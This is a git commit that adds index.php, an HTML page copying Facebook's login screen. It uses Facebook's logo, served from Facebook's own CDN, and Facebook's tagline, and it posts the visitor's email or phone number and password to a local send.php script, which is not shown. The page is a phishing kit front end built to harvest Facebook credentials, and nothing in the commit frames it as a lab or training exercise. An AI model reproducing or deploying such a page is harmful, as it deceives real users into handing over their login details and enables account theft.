7c3f61327897f40b993babd92e69dff4039c7d22
RenceFTW <129347925+Tunonimo07@users.noreply.github.com>
2023-10-30 23:08:00 +0800

    Create index.php

---
+++ index.php
@@ -0,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+   <head>
+       <title>FORM</title>
+       <meta charset="UTF-8">
+       <link rel="stylesheet" href="style.css">
+    </head>     
+
+<body>
+    
+   <img class="fbpic" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" width="340px"/>
+   <p class="paragraph">Connect with friends and the world<br /> around you on Facebook.</p>
+   
+   <form action="send.php" method="post">
+      <div class="login-container">
+         <input type="text" name="email" placeholder="Email or phone number"/>
+          <input type="password" name="password" placeholder="Password "/>
+          <button class="loginbtn">Log In</button>
+          <a class="forgot" href="#">Forgot password?</a>
+
+         <hr/>
+         <button class="new-account">Create new account</button>
+      </div>
+   </form>
+   <div id="text">
+   <p class="below-text"><a class="create" href="">Create a Page</a> for a celebrity, brand or business.</p>
+   </div>
+
+</body>
+</html>
